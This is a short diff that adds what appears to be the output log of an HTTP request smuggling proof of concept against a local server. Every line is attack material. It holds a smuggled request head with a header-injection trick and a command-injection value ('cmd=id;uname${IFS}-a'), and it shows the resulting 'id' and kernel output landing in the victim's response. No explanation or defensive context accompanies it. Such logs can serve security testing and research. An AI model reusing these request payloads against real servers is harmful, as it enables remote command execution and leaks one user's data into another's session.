@@ -1,0 +1,9 @@
+ATTACKER -> b'HTTP/1.1 200 OK\r\nContent-Length: 5\r\nConnection: keep-alive\r\n\r\nCLEAN'
+VICTIM   -> b'HTTP/1.1 200 OK\r\nContent-Length: 240\r\nConnection: keep-alive\r\n\r\nEXEC:uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),101(lxd)\nLinux gauss 7.0.0-31-generic #31-Ubuntu SMP PREEMPT_DYNAMIC Sat Aug  1 04:26:38 UTC 2026 x86_64 GNU/Linux\n'
+
+--- upstream request heads ---
+ 1: 'GET /x\r\nHost: up'
+ 2: 'GET /exec?cmd=id;uname${IFS}-a HTTP/1.1\r\nHost: up\r\nX-Pad:  HTTP/1.1\r\nHost: 127.0.0.1:18471\r\nConnection: keep-alive'
+ 3: 'GET /victim HTTP/1.1\r\nHost: 127.0.0.1:18471\r\nConnection: keep-alive'
+--- srvlog ---
+
